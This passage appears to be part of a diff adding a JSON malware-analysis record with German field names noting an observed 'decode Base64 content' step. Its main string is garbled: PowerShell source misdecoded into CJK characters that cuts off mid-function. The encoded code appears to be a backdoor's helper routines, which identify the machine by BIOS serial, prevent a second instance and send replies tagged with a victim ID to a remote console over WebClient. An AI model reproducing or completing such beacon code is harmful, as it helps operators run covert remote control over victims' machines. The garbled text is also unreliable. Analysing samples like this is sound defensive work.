+      "爣来潩⁮敨灬牥映湵瑣潩獮਍畦据楴湯传瑵䐭扥杵嬨瑓楲杮⑝桴䵥杳 ൻ †琠祲笠਍††††晩⠠圤瑩䑨扥杵 ൻ †††††椠⁦嬨瑓楲杮㩝䤺乳汵佬䕲灭祴␨潌䙧汩⥥ ⁻嬢䕄啂嵇∠⬠␠桴䵥杳簠传瑵䐭晥畡瑬素਍††††††汥敳笠∠䑛䉅䝕⁝•‫琤敨獍⁧⁼摁ⵤ潃瑮湥⁴䰤杯楆敬素਍†††素਍††⁽慣捴⁨絻਍ൽ昊湵瑣潩⁮敇⵴楂獯敓楲污⤨笠਍††猤⁮‽䈢佉⁓乕之坏≎਍††弤湳㴠∠ഢ †琠祲笠਍††††洤敓牡档牥㴠䜠瑥圭業扏敪瑣ⴠ畑牥⁹匢䱅䍅⁔敓楲污畎扭牥䘠佒⁍楗㍮弲䥂协•攭⁡楓敬瑮祬潃瑮湩敵਍††††晩⠠洤敓牡档牥 ൻ †††††映牯慥档⠠漤椠⁮洤敓牡档牥 ൻ †††††††椠⁦␨⹯牐灯牥楴獥丮浡⁥攭ⁱ匢牥慩乬浵敢≲ ൻ †††††††††␠獟⁮‽漤倮潲数瑲敩⹳慖畬൥ †††††††素਍††††††ൽ †††素਍††ൽ †挠瑡档笠ൽ †椠⁦嬨瑓楲杮㩝䤺乳汵佬䕲灭祴␨獟⥮ⴠ煥␠慦獬⥥笠␠湳㴠␠獟⁮ൽ †爠瑥牵⁮␢湳㬢਍ൽ昊湵瑣潩⁮潃癮牥⵴潔慂敳㐶嬨瑳楲杮⁝琤敨潓牵散 ൻ †爠瑥牵⁮䍛湯敶瑲㩝吺䉯獡㙥匴牴湩⡧呛硥⹴湅潣楤杮㩝唺䙔⸸敇䉴瑹獥␨桴卥畯捲⥥ഩ紊਍畦据楴湯䌠湯敶瑲䘭潲䉭獡㙥⠴獛牴湩嵧␠桴卥畯捲⥥笠਍††敲畴湲嬠敔瑸䔮据摯湩嵧㨺呕㡆䜮瑥瑓楲杮嬨潃癮牥嵴㨺牆浯慂敳㐶瑓楲杮␨桴卥畯捲⥥ഩ紊਍਍畦据楴湯䌠敨正匭捥湯䍤灯⡹獛牴湩嵧␠湵煩敵摉 ൻ †␠敳潣摮潃祰㴠␠慦獬൥ †琠祲笠਍††††渤汵⁬‽呛牨慥楤杮匮浥灡潨敲㩝伺数䕮楸瑳湩⡧甤楮畱䥥⥤਍††††猤捥湯䍤灯⁹‽琤畲൥ †素挠瑡档笠਍††††猤牣灩㩴敓慭桰牯⁥‽敎⵷扏敪瑣吠牨慥楤杮匮浥灡潨敲〨‬ⰱ␠湵煩敵摉ഩ †素਍††敲畴湲␠敳潣摮潃祰਍ൽ⌊湥牤来潩൮ഊ⌊敲楧湯䌠湯潳敬䔠捸慨杮൥䘊湵瑣潩⁮敓摮吭䍯湯潳敬嬨瑓楲杮⁝琤敨湁睳牥 ൻ †椠⁦嬨瑓楲杮㩝䤺乳汵佬䕲灭祴␨桴䅥獮敷⥲ ⁻敲畴湲素਍਍††弤捲㴠∠ഢ †琠祲笠਍††††弤捷㴠丠睥伭橢捥⁴祓瑳浥丮瑥圮扥汃敩瑮਍††††弤捷儮敵祲瑓楲杮䄮摤∨摩Ⱒ␠捳楲瑰洺䥹⥄਍††††弤捷䠮慥敤獲䄮摤∨潃瑮湥⵴祴数Ⱒ∠整瑸栯浴≬ഩ †††␠睟⹣效摡牥⹳摁⡤䄢捣灥≴‬琢硥⽴瑨汭⤢਍††††弤捲㴠␠睟⹣灕潬摡瑓楲杮␨牵䍬湯潳敬‬琤敨湁睳牥ഩഊ †††传瑵䐭扥杵∠敒楣癥摥映潲⁭潣獮汯㩥湠␧␨牟⥣∧਍††††敲畴湲⠠弤捲‬∢ഩ †素਍††慣捴⁨ൻ †††␠敟牲㴠␠⹟潔瑓楲杮⤨਍††††畏⵴敄畢⁧䌢湯潳敬攠捸慨杮⁥牥潲㩲湠"
+    ],
+    "beobachtete_abfolge": [
+      "Base64-Inhalt dekodieren"
+    ]
+  }
+}
